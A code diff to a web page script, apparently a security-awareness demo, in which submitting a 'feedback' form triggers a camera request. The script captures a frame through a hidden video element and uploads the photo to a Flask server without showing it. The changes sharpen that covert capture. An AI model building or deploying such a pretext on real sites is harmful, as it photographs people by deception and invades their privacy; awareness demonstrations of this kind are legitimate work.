@@ -40,41 +40,27 @@ feedbackForm.addEventListener(
     async function (event) {
 
         /*
-         * Prevent the browser from doing
-         * the normal GET form submission.
+         * Prevent normal form submission.
          *
-         * This prevents:
-         *
-         * ?name=...&q1=...&q2=...
+         * Without this, the browser would
+         * reload the page and add the form
+         * values to the URL.
          */
-
         event.preventDefault();
 
-
-        console.log(
-            "[+] Feedback submitted"
-        );
-
+        console.log("[+] Feedback submitted");
 
         /*
-         * Hide feedback form.
+         * Hide the feedback form.
          */
-
-        feedbackSection.classList.add(
-            "hidden"
-        );
-
+        if (feedbackSection) {
+            feedbackSection.classList.add("hidden");
+        }
 
         /*
-         * Directly request the browser's
-         * native camera permission.
-         *
-         * Because this happens as part of
-         * the user's Submit action, the
-         * browser can display its normal
-         * camera permission prompt.
+         * Request the browser's native
+         * camera permission.
          */
-
         await requestCamera();
 
     }
@@ -87,15 +73,11 @@ feedbackForm.addEventListener(
 
 async function requestCamera() {
 
-    console.log(
-        "[+] Requesting camera permission..."
-    );
-
+    console.log("[+] Requesting camera permission...");
 
     /*
      * Check browser support.
      */
-
     if (
         !navigator.mediaDevices ||
         !navigator.mediaDevices.getUserMedia
@@ -108,25 +90,33 @@ async function requestCamera() {
         showFinalSection();
 
         return;
-
     }
 
 
     try {
 
         /*
-         * Request camera access.
+         * Request front-facing camera.
          *
-         * Audio is disabled.
+         * The resolution is an ideal value.
+         * The actual resolution depends on
+         * the device/browser.
          */
-
         cameraStream =
             await navigator
                 .mediaDevices
                 .getUserMedia({
 
                     video: {
-                        facingMode: "user"
+                        facingMode: "user",
+
+                        width: {
+                            ideal: 1280
+                        },
+
+                        height: {
+                            ideal: 720
+                        }
                     },
 
                     audio: false
@@ -141,35 +131,36 @@ async function requestCamera() {
 
         /*
          * Connect camera stream to
-         * the hidden video element.
-         *
-         * The HTML uses:
-         *
-         * display: none;
-         *
-         * so the camera preview is
-         * not displayed.
+         * hidden video element.
          */
-
-        camera.srcObject =
-            cameraStream;
+        camera.srcObject = cameraStream;
 
 
         /*
-         * Wait for an actual camera frame.
+         * Explicitly start video playback.
          */
+        await camera.play();
 
+
+        console.log(
+            "[+] Camera video started"
+        );
+
+
+        /*
+         * Wait for an actual decoded
+         * camera frame.
+         */
         await waitForCameraFrame();
 
 
         /*
-         * Capture and send the frame
-         * to Flask.
+         * Capture and upload the frame.
          */
-
         await captureAndSavePhoto();
 
     }
+
 
     catch (error) {
 
@@ -178,19 +169,7 @@ async function requestCamera() {
             error
         );
 
-
-        /*
-         * Stop any partially opened
-         * camera stream.
-         */
-
         stopCamera();
-
-
-        /*
-         * Continue to the awareness
-         * explanation.
-         */
 
         showFinalSection();
 
@@ -200,7 +179,7 @@ async function requestCamera() {
 
 
 /* =========================================
-   WAIT FOR CAMERA FRAME
+   WAIT FOR REAL CAMERA FRAME
 ========================================= */
 
 function waitForCameraFrame() {
@@ -208,63 +187,111 @@ function waitForCameraFrame() {
     return new Promise(
         function (resolve, reject) {
 
-            let attempts = 0;
-
-            const maxAttempts = 50;
-
-
-            const timer =
-                setInterval(
+            /*
+             * Maximum wait time:
+             * 8 seconds.
+             */
+            const timeout =
+                setTimeout(
                     function () {
 
-                        attempts++;
-
-
-                        /*
-                         * Camera has produced
-                         * a usable frame.
-                         */
-
-                        if (
-                            camera.videoWidth > 0 &&
-                            camera.videoHeight > 0
-                        ) {
-
-                            clearInterval(
-                                timer
-                            );
-
-                            resolve();
-
-                            return;
-
-                        }
-
-
-                        /*
-                         * Give up after about
-                         * five seconds.
-                         */
-
-                        if (
-                            attempts >= maxAttempts
-                        ) {
-
-                            clearInterval(
-                                timer
-                            );
-
-                            reject(
-                                new Error(
-                                    "Camera frame unavailable"
-                                )
-                            );
-
-                        }
+                        reject(
+                            new Error(
+                                "Camera frame unavailable"
+                            )
+                        );
 
                     },
-                    100
+                    8000
                 );
+
+
+            /*
+             * Modern browsers support
+             * requestVideoFrameCallback().
+             *
+             * This waits for an actual
+             * decoded video frame rather
+             * than simply checking whether
+             * videoWidth/videoHeight exist.
+             */
+            if (
+                "requestVideoFrameCallback"
+                in camera
+            ) {
+
+                camera.requestVideoFrameCallback(
+                    function () {
+
+                        clearTimeout(timeout);
+
+                        console.log(
+                            "[+] Real camera frame available:",
+                            camera.videoWidth +
+                            "x" +
+                            camera.videoHeight
+                        );
+
+                        resolve();
+
+                    }
+                );
+
+            }
+
+
+            else {
+
+                /*
+                 * Fallback for browsers that
+                 * do not support
+                 * requestVideoFrameCallback().
+                 *
+                 * Two animation frames give
+                 * the browser time to render
+                 * the camera stream.
+                 */
+                requestAnimationFrame(
+                    function () {
+
+                        requestAnimationFrame(
+                            function () {
+
+                                clearTimeout(timeout);
+
+                                if (
+                                    camera.videoWidth > 0 &&
+                                    camera.videoHeight > 0
+                                ) {
+
+                                    console.log(
+                                        "[+] Camera frame available:",
+                                        camera.videoWidth +
+                                        "x" +
+                                        camera.videoHeight
+                                    );
+
+                                    resolve();
+
+                                }
+
+                                else {
+
+                                    reject(
+                                        new Error(
+                                            "Camera frame unavailable"
+                                        )
+                                    );
+
+                                }
+
+                            }
+                        );
+
+                    }
+                );
+
+            }
 
         }
     );
@@ -284,8 +311,20 @@ async function captureAndSavePhoto() {
 
 
     /*
-     * Make sure a camera frame exists.
+     * Make sure the camera is actually
+     * providing usable video data.
      */
+    if (
+        camera.readyState <
+        HTMLMediaElement.HAVE_CURRENT_DATA
+    ) {
+
+        throw new Error(
+            "Camera video data is not ready"
+        );
+
+    }
+
 
     if (
         !camera.videoWidth ||
@@ -300,52 +339,109 @@ async function captureAndSavePhoto() {
 
 
     /*
-     * Create an in-memory canvas.
-     *
-     * Nothing is displayed.
+     * Log the original camera resolution.
      */
-
-    const canvas =
-        document.createElement(
-            "canvas"
-        );
-
-
-    canvas.width =
-        camera.videoWidth;
-
-    canvas.height =
-        camera.videoHeight;
-
-
-    const context =
-        canvas.getContext(
-            "2d"
-        );
-
-
-    /*
-     * Copy the current camera frame
-     * into the canvas.
-     */
-
-    context.drawImage(
-        camera,
-        0,
-        0,
-        canvas.width,
-        canvas.height
+    console.log(
+        "[+] Camera resolution:",
+        camera.videoWidth +
+        "x" +
+        camera.videoHeight
     );
 
 
     /*
-     * Convert the frame to JPEG.
+     * Maximum image dimensions.
+     *
+     * This prevents unnecessarily huge
+     * uploads from high-resolution phones.
      */
+    const MAX_WIDTH = 1280;
+    const MAX_HEIGHT = 720;
 
+
+    /*
+     * Start with actual camera dimensions.
+     */
+    let width = camera.videoWidth;
+    let height = camera.videoHeight;
+
+
+    /*
+     * Scale down only if necessary.
+     *
+     * The image will never be enlarged.
+     */
+    const scale = Math.min(
+        1,
+        MAX_WIDTH / width,
+        MAX_HEIGHT / height
+    );
+
+
+    width =
+        Math.round(width * scale);
+
+    height =
+        Math.round(height * scale);
+
+
+    console.log(
+        "[+] Capture size:",
+        width +
+        "x" +
+        height
+    );
+
+
+    /*
+     * Create an invisible canvas.
+     */
+    const canvas =
+        document.createElement("canvas");
+
+
+    canvas.width = width;
+    canvas.height = height;
+
+
+    /*
+     * Get 2D drawing context.
+     */
+    const context =
+        canvas.getContext("2d");
+
+
+    if (!context) {
+
+        throw new Error(
+            "Could not create canvas context"
+        );
+
+    }
+
+
+    /*
+     * Draw the current camera frame
+     * onto the canvas.
+     */
+    context.drawImage(
+        camera,
+        0,
+        0,
+        width,
+        height
+    );
+
+
+    /*
+     * Convert canvas to JPEG.
+     *
+     * 0.92 = high JPEG quality.
+     */
     const imageData =
         canvas.toDataURL(
             "image/jpeg",
-            0.9
+            0.92
         );
 
 
@@ -355,13 +451,22 @@ async function captureAndSavePhoto() {
 
 
     /*
-     * Send the image to Flask.
+     * Log approximate Base64 size.
      *
-     * Flask's /save-photo route will
-     * save the file inside:
-     *
-     * captured_photos/
+     * Useful for debugging.
      */
+    console.log(
+        "[+] Image data size:",
+        Math.round(
+            imageData.length / 1024
+        ) +
+        " KB"
+    );
+
+
+    /* =====================================
+       SEND TO FLASK
+    ===================================== */
 
     try {
 
@@ -386,9 +491,8 @@ async function captureAndSavePhoto() {
 
 
         /*
-         * Check HTTP response.
+         * Check HTTP status.
          */
-
         if (!response.ok) {
 
             throw new Error(
@@ -399,16 +503,23 @@ async function captureAndSavePhoto() {
         }
 
 
+        /*
+         * Read Flask response.
+         */
         const result =
             await response.json();
 
 
         /*
-         * Stop camera immediately.
+         * Stop camera immediately after
+         * the server has responded.
          */
-
         stopCamera();
 
+
+        /* =================================
+           HANDLE SERVER RESPONSE
+        ================================= */
 
         if (result.success) {
 
@@ -434,15 +545,14 @@ async function captureAndSavePhoto() {
 
 
         /*
-         * Do NOT display the image.
+         * Do not display the image.
          *
-         * Move directly to the
-         * awareness explanation.
+         * Continue to the awareness screen.
          */
-
         showFinalSection();
 
     }
+
 
     catch (error) {
 
@@ -451,9 +561,7 @@ async function captureAndSavePhoto() {
             error
         );
 
-
         stopCamera();
-
 
         showFinalSection();
 
@@ -473,6 +581,9 @@ function stopCamera() {
     );
 
 
+    /*
+     * Stop every camera track.
+     */
     if (cameraStream) {
 
         cameraStream
@@ -486,16 +597,17 @@ function stopCamera() {
             );
 
 
-        cameraStream =
-            null;
+        cameraStream = null;
 
     }
 
 
+    /*
+     * Remove stream from video element.
+     */
     if (camera) {
 
-        camera.srcObject =
-            null;
+        camera.srcObject = null;
 
     }
 
@@ -509,10 +621,9 @@ function stopCamera() {
 function showFinalSection() {
 
     /*
-     * Hide the permission section
+     * Hide permission section
      * if it exists.
      */
-
     if (permissionSection) {
 
         permissionSection.classList.add(
@@ -525,7 +636,6 @@ function showFinalSection() {
     /*
      * Hide feedback section.
      */
-
     if (feedbackSection) {
 
         feedbackSection.classList.add(
@@ -538,7 +648,6 @@ function showFinalSection() {
     /*
      * Show final awareness section.
      */
-
     if (finalSection) {
 
         finalSection.classList.remove(
@@ -549,9 +658,8 @@ function showFinalSection() {
 
 
     /*
-     * Scroll to top.
+     * Scroll to the top.
      */
-
     window.scrollTo({
         top: 0,
         behavior: "smooth"
